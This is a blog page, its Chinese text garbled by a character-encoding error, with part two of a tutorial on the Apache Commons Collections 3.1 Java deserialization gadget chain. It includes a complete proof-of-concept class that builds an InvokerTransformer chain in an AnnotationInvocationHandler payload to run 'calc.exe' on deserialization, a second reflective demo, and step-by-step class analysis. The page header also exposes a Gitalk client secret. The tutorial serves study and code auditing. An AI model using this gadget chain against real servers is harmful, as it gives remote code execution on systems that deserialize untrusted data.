<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    
    <title>Java ååºåˆ—åŒ–åˆ†æä»å…¥é—¨åˆ°æ”¾å¼ƒï¼ˆäºŒï¼‰ | MyBlogs</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

    
      <meta name="google-site-verification" content="XXX" />
    

    
        <meta property="algolia:search" data-application-id="T8IRMXQO87" data-api-key="614acade121cd1054c73da7b48c66120" data-index-name="test">
    

    

    

    
        <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>ğŸ®</text></svg>">
    

    
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    

    

    
<link rel="stylesheet" href="/dist/build.css?v=1637200696663.css">


    
<link rel="stylesheet" href="/dist/custom.css?v=1637200696663.css">


    <script>
        window.isPost = true
        window.aomori = {
            
            gitalk: {
                enable: true,
                clientID: "1e42dab70ec4e2fd8191",
                clientSecret: "f1affa73451031e968478d31426bde82f4526aed",
                repo: "Hasaki-h2.github.io",
                owner: "Hasaki-h2",
                admin: ["admin",],
                distractionFreeMode: true  // Facebook-like distraction free mode
            },
            
            
            
        }
        window.aomori_logo_typed_animated = true
        window.aomori_search_algolia = true

    </script>

<meta name="generator" content="Hexo 5.4.0"></head>

<body>

    <div class="container">
    <header class="header">
        <div class="header-type">
            
            <div class="header-type-avatar avatar avatar-sm">
                <img src="/images/avatar.jpg" alt="">
            </div>
            
            <div class="header-type-inner">
                
                    <div id="typed-strings" style="display:none">
                        <p>MyBlogs</p>
                    </div>
                    <a class="header-type-title" id="typed" href="/"></a>
                
    
                
            </div>
        </div>
        <div class="header-menu">
            <div class="header-menu-inner">
                
                <a href="/">Home</a>
                
                <a href="/archives">Archives</a>
                
            </div>
            <div class="header-menu-social">
                
    <a class="social" target="_blank" href="">
        <box-icon type='' name=''></box-icon>
    </a>

    <a class="social" target="_blank" href="">
        <box-icon type='' name=''></box-icon>
    </a>

            </div>
        </div>

        <div class="header-menu-mobile">
            <div class="header-menu-mobile-inner" id="mobile-menu-open">
                <i class="icon icon-menu"></i>
            </div>
        </div>
    </header>

    <div class="header-menu-mobile-menu">
        <div class="header-menu-mobile-menu-bg"></div>
        <div class="header-menu-mobile-menu-wrap">
            <div class="header-menu-mobile-menu-inner">
                <div class="header-menu-mobile-menu-close" id="mobile-menu-close">
                    <i class="icon icon-cross"></i>
                </div>
                <div class="header-menu-mobile-menu-list">
                    
                    <a href="/">Home</a>
                    
                    <a href="/archives">Archives</a>
                    
                </div>
            </div>
        </div>
    </div>

</div>

    <div class="container">
        <div class="main">
            <section class="inner">
                <section class="inner-main">
                    <div class="post">
    <article id="post-ckwdlojwz0065704z1l7caj2v" class="article article-type-post" itemscope
    itemprop="blogPost">

    <div class="article-inner">

        
          
        
        
        

        
        <header class="article-header">
            
  
    <h1 class="article-title" itemprop="name">
      Java ååºåˆ—åŒ–åˆ†æä»å…¥é—¨åˆ°æ”¾å¼ƒï¼ˆäºŒï¼‰
    </h1>
  

        </header>
        

        <div class="article-more-info article-more-info-post hairline">

            <div class="article-date">
  <time datetime="2021-03-23T13:09:53.000Z" itemprop="datePublished">2021-03-23</time>
</div>

            
            <div class="article-category">
                <a class="article-category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">ä»£ç å®¡è®¡</a>
            </div>
            

            
            <div class="article-tag">
                <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/" rel="tag">Java</a></li></ul>
            </div>
            

            
            <div class="article-busuanzi">
                æœ‰ <span id="busuanzi_value_page_pv">N</span> äººçœ‹è¿‡
            </div>
            

        </div>

        <div class="article-entry post-inner-html hairline" itemprop="articleBody">
            <p>åŸºç¡€çŸ¥è¯†å‚è€ƒï¼š  <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38963246/article/details/115104547">Java ååºåˆ—åŒ–åˆ†æä»å…¥é—¨åˆ°æ”¾å¼ƒï¼ˆä¸€ï¼‰</a><span id="more"></span></p>
<h1 id="ä¸€ã€ç¯å¢ƒé…ç½®"><a href="#ä¸€ã€ç¯å¢ƒé…ç½®" class="headerlink" title="ä¸€ã€ç¯å¢ƒé…ç½®"></a>ä¸€ã€ç¯å¢ƒé…ç½®</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;æœ¬æ¬¡åˆ†æçš„æ˜¯<code>CommonsCollections3.1</code>çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼ŒJavaç¯å¢ƒä¸º<code>jdk1.8.0_261</code> ï¼Œä½¿ç”¨çš„IDEæ˜¯<code>eclipse</code>ã€‚</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;éœ€è¦ä¸‹è½½ä¸€äº›ä¾èµ–ç¯å¢ƒï¼š<code>CommonsCollections3.1</code>çš„æºç å’Œ<code>zip</code>æ–‡ä»¶ã€‚<br><code>CommonsCollections3.1</code> ä¸‹è½½åœ°å€ï¼š<br><a target="_blank" rel="noopener" href="https://commons.apache.org/proper/commons-collections/download_collections.cgi">https://commons.apache.org/proper/commons-collections/download_collections.cgi</a></p>
<h3 id="1ã€-é…ç½®è¿è¡Œç¯å¢ƒ"><a href="#1ã€-é…ç½®è¿è¡Œç¯å¢ƒ" class="headerlink" title="1ã€ é…ç½®è¿è¡Œç¯å¢ƒ"></a>1ã€<font color=cc66ff > é…ç½®è¿è¡Œç¯å¢ƒ</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;æ–°å»ºJavaé¡¹ç›®ï¼Œæ³¨æ„é€‰æ‹©è¿è¡Œç¯å¢ƒç‰ˆæœ¬ï¼Œä½¿ç”¨<code>jdk1.7.0_80</code>ã€‚<br><img src="https://img-blog.csdnimg.cn/2021032909165185.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>ä¹‹åæ–°å»ºç±»<a id="1" ><code>Serialize_Test_Poc</code>ï¼š</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Serialize_Test_Poc</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//æ­¤å¤„æ„å»ºäº†ä¸€ä¸ªtransformersçš„æ•°ç»„ï¼Œåœ¨å…¶ä¸­æ„å»ºäº†ä»»æ„å‡½æ•°æ‰§è¡Œçš„æ ¸å¿ƒä»£ç </span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å°†transformersæ•°ç»„å­˜å…¥ChaniedTransformerè¿™ä¸ªç»§æ‰¿ç±»</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åˆ›å»ºMapå¹¶ç»‘å®štransformerChina</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//ç»™äºˆmapæ•°æ®è½¬åŒ–é“¾</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * //è§¦å‘æ¼æ´ Map.Entry onlyElement = (Map.Entry)</span></span><br><span class="line"><span class="comment">		 * outerMap.entrySet().iterator().next();</span></span><br><span class="line"><span class="comment">		 * //outerMapåä¸€ä¸²ä¸œè¥¿ï¼Œå…¶å®å°±æ˜¯è·å–è¿™ä¸ªmapçš„ç¬¬ä¸€ä¸ªé”®å€¼å¯¹ï¼ˆvalue,valueï¼‰ï¼›ç„¶åè½¬åŒ–æˆMap.Entryå½¢å¼ï¼Œ</span></span><br><span class="line"><span class="comment">		 * è¿™æ˜¯mapçš„é”®å€¼å¯¹æ•°æ®æ ¼å¼ onlyElement.setValue(&quot;foobar&quot;);</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//åå°„æœºåˆ¶è°ƒç”¨ AnnotationInvocationHandler ç±»çš„æ„é€ å‡½æ•°</span></span><br><span class="line">        Class cl = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">//è¿”å›æŒ‡å®šå‚æ•°ç±»å‹çš„æ‰€æœ‰æ„é€ å™¨ï¼ŒåŒ…æ‹¬publicçš„å’Œépublicçš„ï¼Œå½“ç„¶ä¹ŸåŒ…æ‹¬privateçš„</span></span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        <span class="comment">//å–æ¶ˆæ„é€ å‡½æ•°ä¿®é¥°ç¬¦é™åˆ¶</span></span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//è·å–å®ä¾‹</span></span><br><span class="line">        Object instance = ctor.newInstance(Target.class, outerMap);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="comment">//payloadåºåˆ—åŒ–å†™å…¥æ–‡ä»¶ï¼Œæ¨¡æ‹Ÿç½‘ç»œä¼ è¾“</span></span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(instance);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//æœåŠ¡ç«¯è¯»å–æ–‡ä»¶ï¼Œååºåˆ—åŒ–ï¼Œæ¨¡æ‹Ÿç½‘ç»œä¼ è¾“</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line">        fin.readObject();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="2ã€-å¯¼å…¥ä¾èµ–åŒ…"><a href="#2ã€-å¯¼å…¥ä¾èµ–åŒ…" class="headerlink" title="2ã€ å¯¼å…¥ä¾èµ–åŒ…"></a>2ã€<font color=cc33ff > å¯¼å…¥ä¾èµ–åŒ…</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;é€‰ä¸­é¡¹ç›®å³é”®é…ç½®Build pathï¼š<br><img src="https://img-blog.csdnimg.cn/20210323134155405.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é€‰æ‹©Libraries =&gt; Add External JARS  =&gt;é€‰æ‹©ä¸‹è½½çš„æ–‡ä»¶=&gt; Apply and Closeã€‚<br><img src="https://img-blog.csdnimg.cn/20210323134312432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h3 id="3ã€-å…³è”æºæ–‡ä»¶"><a href="#3ã€-å…³è”æºæ–‡ä»¶" class="headerlink" title="3ã€ å…³è”æºæ–‡ä»¶"></a>3ã€<font color=cc00ff > å…³è”æºæ–‡ä»¶</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;åœ¨ä»£ç è°ƒè¯•ä¸­è¦åˆ†ææºæ–‡ä»¶ï¼Œæ‰€ä»¥è¦å…³è”æºæ–‡ä»¶ã€‚ä½¿ç”¨Java Decompileråç¼–è¯‘<code>jre1.7.0_80\lib\rt.jar</code>,Java Decompilerä¸‹è½½åœ°å€ï¼š<br><a target="_blank" rel="noopener" href="http://java-decompiler.github.io/">http://java-decompiler.github.io/</a><br><img src="https://img-blog.csdnimg.cn/20210329102923681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŠŠå¯¼å‡ºçš„zipæ–‡ä»¶ä¸¢åœ¨jreçš„ç›®å½•ä¸‹å³å¯ã€‚<br><img src="https://img-blog.csdnimg.cn/20210329103611377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>é€‰ä¸­é¡¹ç›®ï¼Œå³é”® =&gt; <code>Run As</code> =&gt; <code>Run Configurations</code><br><img src="https://img-blog.csdnimg.cn/20210323133746197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>é€‰æ‹©<code>Alternate JRE</code>=&gt;ç‚¹å‡» =&gt; <code>Installed JREs</code>ã€‚<br><img src="https://img-blog.csdnimg.cn/20210329103048965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>å¦‚æœæ²¡æœ‰é…ç½®å°±ç‚¹å‡»Addæ·»åŠ è‡ªå·±çš„jdkè·¯å¾„ï¼Œæ·»åŠ ä¹‹åé€‰ä¸­å¹¶ç‚¹å‡»<code>Edit</code>ã€‚<br><img src="https://img-blog.csdnimg.cn/2021032910314523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>é€‰æ‹©<code>rt.jar</code> =&gt; <code>Source Attachment</code> =&gt; <code>External location</code> =&gt; <code>External File</code>ã€‚<br><img src="https://img-blog.csdnimg.cn/2021032910340420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h1 id="äºŒã€ä»£ç åˆ†æ"><a href="#äºŒã€ä»£ç åˆ†æ" class="headerlink" title="äºŒã€ä»£ç åˆ†æ"></a>äºŒã€ä»£ç åˆ†æ</h1><h3 id="1ã€InvokerTransformer"><a href="#1ã€InvokerTransformer" class="headerlink" title="1ã€InvokerTransformer"></a>1ã€<font color=#ffff00 >InvokerTransformer</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CC3.1jaråŒ…ä¸­ï¼ŒInvokerTransformerçš„transformæ–¹æ³•ä¼šé€šè¿‡åå°„æœºåˆ¶å»è°ƒç”¨ä»»æ„å‡½æ•°ã€‚<br>ç±»æ‰€åœ¨è·¯å¾„:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commons-collections-3.1.jar!/org/apache/commons/collections/functors/InvokerTransformer.class</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æºç ï¼š<br><img src="https://img-blog.csdnimg.cn/20210323162917905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å…¶å®ç±»<code>InvokerTransformer</code>æ˜¯å®ç°äº†<code>Transformer</code>æ¥å£ï¼Œä½†ç”±äº<strong>æ¥å£å›è°ƒ</strong>çš„ç‰¹æ€§ï¼Œæ‰§è¡Œçš„æ–¹æ³•è¿˜æ˜¯<code>InvokerTransformer</code>çš„<code>transform</code>æ–¹æ³•ã€‚</p>
<p><strong><code>Transformer</code></strong> æ¥å£å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<img src="https://img-blog.csdnimg.cn/20210323164604458.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><code>InvokerTransformer</code>å®ç°<code>Transformer</code>æ¥å£å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="https://img-blog.csdnimg.cn/2021032316504098.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>å¯è§é€šè¿‡å¤šæ¬¡è°ƒç”¨<code>InvokerTransformer</code>çš„<code>transform</code>æ–¹æ³•å³å¯å®ç°è°ƒç”¨ä¸€æ¡å‘½ä»¤æ‰§è¡Œé“¾ã€‚</p>
<p>ä»¥<font color=#ff0000 >InvokerTransformerDemo </font>ç±»ä¸ºä¾‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformerDemo</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//åˆ©ç”¨Javaåå°„è·å–ç±»å¯¹è±¡</span></span><br><span class="line">		Class runtimeClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//åˆ©ç”¨InvokerTransformerçš„transformä¼šé€šè¿‡åå°„æœºåˆ¶å»è°ƒç”¨ä»»æ„å‡½æ•°</span></span><br><span class="line">		<span class="comment">//è¿”å› java.lang.Runtimeçš„classå¯¹è±¡-&gt;m_getMethod,å¯ä»¥ç±»æ¯”ä¸‹ä¸€è¡Œåˆ†æ</span></span><br><span class="line">		<span class="comment">//java.lang.Runtime.getMethod(&quot;getRuntime&quot;) -&gt; è¿”å› java.lang.Runtime.getRuntime æ–¹æ³•</span></span><br><span class="line">		<span class="comment">//new Class[] æ–°å»ºä¸€ä¸ªç±»æ•°ç»„ï¼Œå€¼ä¸ºString.class,Class[].class</span></span><br><span class="line">		Object m_getMethod = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">				<span class="string">&quot;getMethod&quot;</span>, </span><br><span class="line">				<span class="comment">//getMethod()çš„å‚æ•°ç±»å‹æ˜¯&#123;&quot;getRuntime&quot;,null&#125;,æ‰€ä»¥new Class[]çš„ç±»å‹ä¸ºString.class</span></span><br><span class="line">				<span class="keyword">new</span> Class[] &#123;String.class,Class[].class&#125;,</span><br><span class="line">				<span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;</span><br><span class="line">				).transform(runtimeClass);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//java.lang.Runtime.getRuntime.invoke() -&gt; è¿”å› java.lang.Runtime.getRuntime() å¯¹è±¡</span></span><br><span class="line">		Object runtime = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">				<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">				<span class="comment">//invoke(å¯¹è±¡ï¼Œå‚æ•°)ï¼Œæ‰€ä»¥new Class[] çš„ç±»å‹ä¸ºObject.class</span></span><br><span class="line">				<span class="keyword">new</span> Class[] &#123;Object.class,Object[].class&#125;,</span><br><span class="line">				<span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;</span><br><span class="line">				).transform(m_getMethod);</span><br><span class="line">		<span class="comment">//java.lang.Runtime.getRuntime().exec(&quot;calc.exe&quot;)</span></span><br><span class="line">		Object exec = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">				<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">				<span class="comment">//exec(&#x27;calc.exe&#x27;)åªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œæ‰€ä»¥new Class[] çš„ç±»å‹ä¸ºString.class</span></span><br><span class="line">				<span class="keyword">new</span> Class[] &#123;String.class&#125;,</span><br><span class="line">				<span class="keyword">new</span> Object[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;</span><br><span class="line">				).transform(runtime);	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆæ„æˆäº†ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œé“¾ï¼š<font color=#00ff00 >Class.forName(â€œjava.lang.Runtimeâ€).getMethod(â€œgetRuntimeâ€).invoke(null).exec(â€˜calc.exeâ€™)</p>
<h3 id="2ã€Transformer"><a href="#2ã€Transformer" class="headerlink" title="2ã€Transformer"></a>2ã€<font color=#ffcc00 >Transformer</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ç°åœ¨çŸ¥é“InvokerTransformerçš„transformæ–¹æ³•å¯ä»¥è°ƒç”¨ä»»æ„å‡½æ•°ï¼Œç°åœ¨éœ€è¦æŸ¥æ‰¾è°ƒç”¨transformæ–¹æ³•çš„ç±»ã€‚<br>å…¶ä¸­æœ‰ä»¥ä¸‹ä¸¤ä¸ªç±»ï¼š<font color=#0d00d6 >ConstantTransformerï¼ŒChainedTransformer</font>ï¼Œ<br><font color=#16e019 >ConstantTransformer</font>ç±»å®ç°äº†Transformeræ¥å£ï¼Œtransformä¼šç›´æ¥è¿”å›å®ä¾‹åŒ–æ—¶ä¼ å…¥çš„å¯¹è±¡ã€‚<br><font color=#16e019 >ConstantTransformer</font>è·¯å¾„ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commons-collections-3.1.jar!/org/apache/commons/collections/functors/ConstantTransformer.class</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20210323180200721.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p><font color=#f52c00 >ChainedTransformer</font>ç±»ä¹Ÿå®ç°äº†Transformeræ¥å£ï¼Œå®ƒçš„ transform â½…æ³•ä¼šå¾ªç¯è°ƒâ½¤ Transformer æ•°ç»„å¯¹è±¡ä¸­çš„ transform â½…æ³•ï¼Œ<strong>ä¸”ä¸Šä¸€æ¬¡æ‰§è¡Œçš„ç»“æœä¼šè¢«å½“åšä¸‹<br>ä¸€æ¬¡è°ƒç”¨</strong>ï¼Œæœ€ç»ˆè¿”å›Transformer[]æ•°ç»„æœ€åä¸€ä¸ªå€¼æ‰§è¡Œåçš„å¯¹è±¡Runtimeã€‚<br><font color=#f52c00 >ChainedTransformer</font> è·¯å¾„ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commons-collections-3.1.jar!/org/apache/commons/collections/functors/ChainedTransformer.class</span><br></pre></td></tr></table></figure>

